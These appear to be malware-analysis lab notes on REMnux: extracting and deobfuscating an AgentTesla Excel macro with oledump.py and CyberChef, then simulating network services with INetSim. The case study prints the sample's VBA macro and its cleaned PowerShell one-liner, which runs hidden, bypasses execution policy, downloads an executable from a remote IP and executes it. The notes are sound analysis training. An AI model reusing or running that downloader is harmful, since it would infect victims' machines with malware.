The REMnux VM is a specialised Linux distro. It already includes tools like Volatility, YARA, Wireshark, oledump, and INetSim. It also provides a sandbox-like environment for dissecting potentially malicious software without risking your primary system. It's your lab set up and ready to go without the hassle of manual installations.

---
# File Analysis

we will use `oledump.py` to conduct static analysis on a potentially malicious Excel document. 

`Oledump.py` is a Python tool that analyzes **OLE2** files, commonly called Structured Storage or Compound File Binary Format. **OLE** stands for **Object Linking and Embedding,** a proprietary technology developed by Microsoft. OLE2 files are typically used to store multiple data types, such as documents, spreadsheets, and presentations, within a single file. This tool is handy for extracting and examining the contents of OLE2 files, making it a valuable resource for forensic analysis and malware detection.


### Analyzing Malicious Documents with Oledump.py

#### 1. The Tool: Oledump.py

**Purpose:** A Python tool for analyzing **OLE2 files** (Compound File Binary Format).

**OLE (Object Linking and Embedding):** A Microsoft technology used in files like Office documents (`.doc`, `.xls`, `.ppt`) to store multiple data streams within a single file.

**Use Case:** Essential for forensic analysis and malware detection, particularly for extracting and examining embedded content like VBA macros.

#### 2. Basic Analysis Workflow (Example: AgentTesla)

**Step 1: Scan the File**

**Command:** 

```
oledump.py <filename>
```

**Example:** `oledump.py agenttesla.xlsm`

**Output:** Lists the data streams inside the OLE file.

- **Key Indicator:** A capital **`M`** next to a stream indicates the presence of a **Macro**.

- **Target:** `A4: M 688 'VBA/ThisWorkbook'` is identified as the stream of interest.

![[Pasted image 20260221010657.png]]

**Step 2: Select the Data Stream**

**Command:** 
```
oledump.py <filename> -s <stream_number>
```

**Example:** 
```
oledump.py agenttesla.xlsm -s 4
```

![[Pasted image 20260221011122.png]]

**Output:** Displays the raw content of the selected stream in hex dump format.

**Step 3: Decompress the VBA Macro**

**Command:** Add `--vbadecompress` to the previous command.

**Example:** 
```
oledump.py agenttesla.xlsm -s 4 --vbadecompress
```

![[Pasted image 20260221011312.png]]

**Output:** Decompresses the VBA code, making it human-readable.
This reveals the actual malicious script logic.
#### 3. Case Study: Deobfuscating an AgentTesla Payload

**A. The Obfuscated Script**

The decompressed VBA reveals a variable `Sqtnew` containing a PowerShell command with obfuscation characters (`*` and `^`).
The script then defines functions to clean these characters:
- `Replace(Sqtnew, "*", "")` (Remove all asterisks)
- `Replace(Sqtnew, "^", "")` (Remove all carets)

```
Sqtnew = "^p*o^*w*e*r*s^^*h*e*l^*l* *^-*W*i*n*^d*o*w^*S*t*y*^l*e* *h*i*^d*d*^e*n^* *-*e*x*^e*c*u*t*^i*o*n*pol^icy* *b*yp^^ass*;* $TempFile* *=* *[*I*O*.*P*a*t*h*]*::GetTem*pFile*Name() | Ren^ame-It^em -NewName { $_ -replace 'tmp$', 'exe' } �Pass*Thru; In^vo*ke-We^bRe*quest -U^ri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -Out*File $TempFile; St*art-Proce*ss $TempFile;"
Sqtnew = Replace(Sqtnew, "*", "")
Sqtnew = Replace(Sqtnew, "^", "")
Set Mggcbnuad = CreateObject("WScript.Shell")
Set MggcbnuadExec = Mggcbnuad.Exec(Sqtnew)
```


**B. Deobfuscation with CyberChef**

1.**Input:** Paste the obfuscated string from `Sqtnew` into CyberChef.

2.**Operation 1:** Use **Find/Replace**.

- _Find:_ `*` (as a SIMPLE STRING)    
- _Replace:_ (leave blank)

3.**Operation 2:** Add another **Find/Replace**.

- _Find:_ `^` (as a SIMPLE STRING)        
- _Replace:_ (leave blank)

4.**Output:** The cleaned, readable PowerShell script.

![[Pasted image 20260221011812.png]]

```
"powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' } �PassThru; Invoke-WebRequest -Uri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -OutFile $TempFile; Start-Process $TempFile;"
```

**C. The Final Payload Explained**  
The cleaned script reveals a classic malware downloader pattern:

1.**Execution Evasion:**

- `-WindowStyle hidden`: Runs PowerShell without showing a window to the user.    

- `-executionpolicy bypass`: Overrides Windows' default security policy to allow any script to run.

2.**Download:**

- `Invoke-WebRequest -Uri "http://193.203.203.67/rt/Doc-3737122pdf.exe" -OutFile $TempFile`

- Downloads a file from the remote server. Note the file is named with a `.pdf` extension to appear harmless, but is saved as an `.exe`.

3.**Execution:**

- `Start-Process $TempFile`

- Runs the downloaded executable, completing the infection chain.

#### 4. Summary of the Attack Chain

1.**User Action:** Victim opens the `agenttesla.xlsm` file.

2.**Auto-execution:** The embedded Macro runs automatically.

3.**Payload Staging:** The VBA script builds and executes a hidden, bypassed PowerShell command.

4.**Malware Drop:** PowerShell downloads `Doc-3737122pdf.exe` from a remote C2 server.

5.**Infection:** PowerShell executes the downloaded malware (AgentTesla).

---
# Fake Network to Aid Analysis

During dynamic analysis, it is essential to observe the behaviour of potentially malicious software—especially its network activities. There are many approaches to this. We can create a whole infrastructure, a virtual environment with different core machines, and more. Alternatively, there is a tool inside our REMnux VM called **INetSim: Internet Services Simulation Suite****!**

We will utilize INetSim's features to simulate a real network in this task.

### Dynamic Analysis with INetSim

#### 1. The Tool: INetSim

- **Full Name:** Internet Services Simulation Suite

- **Purpose:** A tool that simulates real network services (HTTP, HTTPS, DNS, SMTP, etc.) in a lab environment.

- **Goal:** To trick malware into thinking it's communicating with a real C2 server, allowing you to observe its network behavior safely.


#### 2. Lab Setup: Two Machines

- **REMnux VM:** The analysis machine that will run INetSim (acting as the "fake internet").

- **AttackBox:** The machine used to interact with the REMnux VM and simulate malware behavior.

#### 3. Configuring INetSim on REMnux

**Step 1: Identify the REMnux IP Address**

- Run `ifconfig` or note the IP in the terminal prompt (e.g., `ubuntu@10.49.155.52`).

**Step 2: Edit the INetSim Configuration**

Open the config file: `sudo nano /etc/inetsim/inetsim.conf`

Find the line: `#dns_default_ip 0.0.0.0`

**Modify it:**

1.Remove the `#` to uncomment the line.

2.Change the IP from `0.0.0.0` to your REMnux machine's IP (e.g., `10.49.155.52`).

Save (`CTRL+O`, Enter) and exit (`CTRL+X`).


**Step 3: Verify the Change**

- Run: `cat /etc/inetsim/inetsim.conf | grep dns_default_ip`

- Confirm the output shows your IP (e.g., `dns_default_ip 10.49.155.52`).

**Step 4: Start INetSim**

- Run: `sudo inetsim`

- **Success Indicator:** The output should end with "**Simulation running**". (Ignore the `http_80_tcp - failed!` warning; it's not needed for this exercise).

#### 4. Simulating Malware Behavior from the AttackBox

**Step 1: Access the Fake Web Service**

- On the **AttackBox**, open a web browser.

- Navigate to `https://<REMnux_IP>` (e.g., `https://10.49.155.52`).

- Ignore the security warning (it's a self-signed certificate) and proceed.

- You should see the **INetSim homepage**, confirming the service is running.


**Step 2: Simulate a Malware Download**

- Mimic a malware sample that downloads secondary payloads.

- Use `wget` from the AttackBox terminal (as root) to download fake files from the INetSim server.

 - **Example 1 (Download a ZIP) :**  `sudo wget https://10.49.155.52/second_payload.zip --no-check-certificate`

- **Example 2 (Download a PowerShell script):**  `sudo wget https://10.49.155.52/second_payload.ps1 --no-check-certificate`

- **Result:** The files are downloaded to your AttackBox. They are harmless and will direct you back to the INetSim homepage if opened.


#### 5. Reviewing the INetSim Report (on REMnux)

1. **Stop INetSim:** Go back to the REMnux terminal and press `CTRL+C` to stop the service.

2. **Locate the Report:** INetSim automatically generates a report of all captured connections. It is saved in: `/var/log/inetsim/report/`

3. **Read the Report:**

    - Use `sudo cat /var/log/inetsim/report/report.<sessionID>.txt`

    - (e.g., `sudo cat /var/log/inetsim/report/report.2594.txt`)

**What the Report Shows:**  
A log of all network connections made while INetSim was running.

- **Timestamp:** When the connection occurred.
    
- **Protocol & Method:** e.g., `HTTPS connection, method: GET`
    
- **URL:** The resource requested (e.g., `https://10.49.155.52/second_payload.ps1`).
    
- **File Served:** The fake file INetSim returned (e.g., `/var/lib/inetsim/http/fakefiles/sample.html`).
    

#### 6. Summary of the Technique

- **Goal:** Observe malware's network communication without letting it connect to a real malicious server.
    
- **Method:** Configure the malware (or the lab network) to point to your INetSim instance. The malware will attempt to "phone home," and INetSim will log the request and respond with a harmless file.
    
- **Result:** You can identify **IPs, URLs, protocols, and file types** the malware tries to reach, which is crucial for threat intelligence and creating network-based detections.